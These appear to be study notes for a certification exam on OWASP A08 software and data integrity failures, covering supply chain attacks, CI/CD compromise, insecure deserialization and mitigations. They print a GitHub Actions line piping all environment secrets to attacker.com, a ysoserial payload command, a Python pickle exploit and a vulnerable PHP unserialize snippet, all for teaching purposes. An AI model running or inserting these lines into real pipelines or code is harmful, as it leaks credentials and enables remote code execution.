### 📌 A08: Software & Data Integrity Failures

**Definition**

- Occurs when code, plugins, libraries, or data pipelines are used **without verifying their integrity** — allowing attackers to inject malicious code through trusted update/CI-CD channels or deserialization of tampered data.

> you trusted the supply chain and the supply chain was cooked 🍳💀

---

**Core Concepts**

- Two distinct sub-categories bundled together:
    - **Software integrity failures** = trusting code/updates from external sources without verification
    - **Data integrity failures** = trusting serialized/deserialized data without validation
- **Supply chain attacks** = compromise happens _upstream_ — you get pwned through something you trusted
- **CI/CD pipeline attacks** = attacker gets into your build/deploy process → malicious code ships to prod
- **Insecure deserialization** = app reconstructs objects from attacker-controlled data → code execution
- Unsigned updates/packages = anyone can tamper with them in transit

---

**How It Works**

**Software integrity (supply chain) flow:**

- App pulls a dependency from npm/PyPI/CDN without checking its hash
- Attacker compromises the upstream package (or typosquats a popular one)
- Malicious version gets pulled into your build → ships to millions of users
- Or: attacker gets into CI/CD pipeline (Jenkins, GitHub Actions) → modifies build script → backdoored binary gets deployed

**Insecure deserialization flow:**

- App serializes objects to send/store state (Java, PHP, Python pickle, .NET, JSON)
- Attacker intercepts/modifies the serialized payload
- App deserializes it without validation → triggers malicious object methods
- Result: **RCE, privilege escalation, auth bypass** depending on the gadget chain
- PHP example:
    
    ```php
    // app deserializes cookie directly$user = unserialize($_COOKIE['user']);
    ```
    
    Attacker crafts malicious serialized object → arbitrary code runs on `unserialize()`

**CI/CD attack flow:**

- Weak access control on pipeline config → attacker pushes malicious workflow
- GitHub Actions secret exfiltration:
    
    ```yaml
    - run: env | curl -d @- https://attacker.com
    ```
    
    → all secrets/env vars (AWS keys, tokens) exfiltrated silently 😈

---

**Key Terminology**

|Term|Meaning|
|---|---|
|Serialization|Converting object state to a storable/transmittable format (JSON, XML, binary)|
|Deserialization|Reconstructing an object from serialized data|
|Gadget chain|Sequence of existing class methods chained to achieve malicious outcome during deserialization|
|Supply chain attack|Compromise delivered through a trusted third-party dependency or vendor|
|Typosquatting|Publishing malicious package with name similar to popular one (`requeests` vs `requests`)|
|SRI (Subresource Integrity)|Browser feature that verifies hash of external scripts/stylesheets|
|CI/CD|Continuous Integration/Continuous Deployment — automated build and deploy pipeline|
|Code signing|Cryptographic signature on code/updates proving authenticity and integrity|
|SBOM|Software Bill of Materials — inventory of all components/dependencies in software|
|Dependency confusion|Attacker uploads public package with same name as internal private package|

---

**Important Technical Details**

- **SRI hashes** on CDN-loaded scripts — if missing, CDN compromise = XSS on every site using it:
    
    ```html
    <script src="https://cdn.example.com/lib.js"  integrity="sha384-[hash]"  crossorigin="anonymous"></script>
    ```
    
    Without `integrity` attribute → tampered CDN file executes with full trust 💀
- **ysoserial** — tool for generating Java deserialization exploit payloads:
    
    ```bash
    java -jar ysoserial.jar CommonsCollections6 'whoami' | base64
    ```
    
- **Python pickle** is essentially RCE-as-a-feature — never deserialize untrusted pickle data:
    
    ```python
    import pickle, osclass Exploit(object):    def __reduce__(self):        return (os.system, ('whoami',))pickle.dumps(Exploit())  # serialize → send to victim app
    ```
    
- **Dependency confusion attack** (Alex Birsan, 2021): internal package `company-utils` → attacker uploads `company-utils` to public PyPI with higher version → build system pulls attacker's version instead 🎯
- **JWT `alg:none`** also falls here — integrity of the token not verified
- Mitigation stack:
    - Pin dependency versions + verify hashes (`pip --require-hashes`, `package-lock.json`)
    - Sign all artifacts (Sigstore, GPG)
    - Restrict CI/CD permissions (least privilege on pipeline secrets)
    - Never deserialize untrusted data — use allowlists, avoid native serialization formats

---

**Real-World Example**

- **SolarWinds (2020)**: Attackers compromised SolarWinds' build pipeline → malicious code injected into legitimate Orion software update → signed by SolarWinds themselves → 18,000+ organizations downloaded it including US government agencies 😨 textbook software integrity failure
- **event-stream npm (2018)**: Maintainer transferred package ownership → new owner added malicious dependency targeting Bitcoin wallet → downloaded 8 million times before discovered
- **Log4Shell adjacent**: Deserialization + JNDI lookup chain → RCE on millions of Java apps

---

> 🔑 **CEH angle:** Know deserialization = potential RCE and what languages are commonly affected (Java, PHP, Python). Know SolarWinds as the canonical supply chain example. Understand SRI for CDN integrity. CI/CD pipeline security is increasingly tested — know that weak pipeline permissions = code execution in production. SBOM is the defensive buzzword here. 🔒